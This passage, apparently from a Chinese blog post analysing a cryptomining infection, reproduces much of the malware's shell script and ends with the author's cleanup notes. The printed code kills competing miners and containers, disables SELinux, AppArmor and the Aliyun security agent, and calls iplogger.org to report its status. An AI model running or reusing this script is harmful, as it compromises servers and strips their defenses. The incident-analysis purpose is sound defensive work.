  rm -rf /dev/shm/z3.sh
  rm -rf /dev/shm/z2.sh
  rm -rf /dev/shm/.scr
  rm -rf /dev/shm/.kerberods
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  chattr -i /etc/ld.so.preload
  rm -f /etc/ld.so.preload
  rm -f /usr/local/lib/libioset.so
  rm -rf /tmp/watchdogs
  rm -rf /etc/cron.d/tomcat
  rm -rf /etc/rc.d/init.d/watchdogs
  rm -rf /usr/sbin/watchdogs
  rm -f /tmp/kthrotlds
  rm -f /etc/rc.d/init.d/kthrotlds
  rm -rf /tmp/.sysbabyuuuuu12
  rm -rf /tmp/logo9.jpg
  rm -rf /tmp/miner.sh
  rm -rf /tmp/nullcrew
  rm -rf /tmp/proc
  rm -rf /tmp/2.sh
  rm /opt/atlassian/confluence/bin/1.sh
  rm /opt/atlassian/confluence/bin/1.sh.1
  rm /opt/atlassian/confluence/bin/1.sh.2
  rm /opt/atlassian/confluence/bin/1.sh.3
  rm /opt/atlassian/confluence/bin/3.sh
  rm /opt/atlassian/confluence/bin/3.sh.1
  rm /opt/atlassian/confluence/bin/3.sh.2
  rm /opt/atlassian/confluence/bin/3.sh.3
  rm -rf /var/tmp/f41
  rm -rf /var/tmp/2.sh
  rm -rf /var/tmp/config.json
  rm -rf /var/tmp/xmrig
  rm -rf /var/tmp/1.so
  rm -rf /var/tmp/kworkerds3
  rm -rf /var/tmp/kworkerdssx
  rm -rf /var/tmp/kworkerds
  rm -rf /var/tmp/wc.conf
  rm -rf /var/tmp/nadezhda.
  rm -rf /var/tmp/nadezhda.arm
  rm -rf /var/tmp/nadezhda.arm.1
  rm -rf /var/tmp/nadezhda.arm.2
  rm -rf /var/tmp/nadezhda.x86_64
  rm -rf /var/tmp/nadezhda.x86_64.1
  rm -rf /var/tmp/nadezhda.x86_64.2
  rm -rf /var/tmp/sustse3
  rm -rf /var/tmp/sustse
  rm -rf /var/tmp/moneroocean/
  rm -rf /var/tmp/devtool
  rm -rf /var/tmp/devtools
  rm -rf /var/tmp/play.sh
  rm -rf /var/tmp/systemctI
  rm -rf /var/tmp/update.sh
  rm -rf /var/tmp/.java
  rm -rf /var/tmp/1.sh
  rm -rf /var/tmp/conf.n
  rm -r /var/tmp/lib
  rm -r /var/tmp/.lib
  rm -rf /tmp/kinsing
  rm -rf /var/tmp/kinsing
  chattr -iau /tmp/lok
  chmod +700 /tmp/lok
  rm -rf /tmp/lok
  echo "killeverything finished"

}

killdockers() {
  echo "killdockers started"
  #yum install -y docker.io || apt-get install docker.io;
  #docker ps | grep "_" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "/bin/bash -c" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "chroot /mnt" | awk '{print $1}' | xargs -I % docker kill %
  #docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "/var/bash" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "cokkokotre1/update" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "lchaia/xmrig" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "patsissons/xmrig" | awk '{print $1}' | xargs -I % docker kill %
  docker ps | grep "challengerd/challengerd" | awk '{print $1}' | xargs -I % docker kill %
  docker images -a | grep "jepsen" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "bash.shell" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "cokkokotre1/update" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "lchaia/xmrig" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "patsissons/xmrig" | awk '{print $3}' | xargs -I % docker rmi -f %
  docker images -a | grep "challengerd/challengerd" | awk '{print $3}' | xargs -I % docker rmi -f %
  echo "killdockers finished"
}

finaltouches() {
  echo "finaltouches started"
  setenforce 0
  echo SELINUX=disabled >/etc/selinux/config
  systemctl stop apparmor
  systemctl disable apparmor
  service apparmor stop
  service apparmor teardown
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  update-rc.d -f apparmor remove
  ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
  rm -rf /usr/local/aegis
  echo "finaltouches finished"
}

checkifrunning() {
  echo "checking if bbb running started"
  ps -aux | grep -v grep | grep -e "bbb/bbb"
  if [ $? -eq 0 ]; then
    echo "bbb running"
    curl -A xesacheck-running/1.4 -sLo /dev/null https://iplogger.org/1iGce7
  else
    echo "bbb not running... attempting to kill"
    #/var/tmp/bbb/bbb || /tmp/bbb/bbb || /opt/bbb/bbb;
    /var/tmp/bbb/bbb
    killall -9 screen
    pkill -9 screen
    echo "fuck i think we running?"
    curl -A wemusthavegotkilled/1.4 -sLo /dev/null https://iplogger.org/1iGce7
  fi
  echo "checkifrunning finished"
}

initialrungo
removealiyun
killeverything
killdockers
finaltouches
checkifrunning
```

主要函数：
``` 
initialrungo    #修改host,更改系统配置，删掉/tmp目录下的一些文件，钱包地址之类的
removealiyun    #卸载阿里云服务，阿里云卸载挺麻烦的，官方有脚本
killeverything  #kill everything
killdockers     #kill docker
finaltouches    #关闭selinux  关闭禁掉一些服务，跟aliyun有仇吗？
checkifrunning  #又来检测自己是否运行了，没有运行的话会关掉所有screen， 重新下载病毒
```


整体流程搞清楚了，解决起来也挺简单的，首先就是把rc.local文件里的脚本删掉，接着就是crontab里的定时任务删掉，再把ssh的配置文件修改掉，把病毒的rsa全部删掉。
病毒建立的4个用户也可以全部删掉，删除的适合有些文件加了ia，可以用他的fix脚本恢复一下，挺快的。其他一些配置，防火墙那里的，host那里的都可以看情况恢复。主要是把启动项，定时任务，还有ssh那里清理干净了就没什么大问题了。

最重要的一点是，向开放一些2376，3376，6379等一些端口的适合特别要注意，有漏洞的版本，尽量早升级。自己也用过阿里云的服务器挖过矿，服务跑起来都挺麻烦的，这病毒还是挺6的。好多地方都能借鉴借鉴，操作尽量脚本化，省时省力省心。

做个笔记，如果错误之处，请指出勿喷。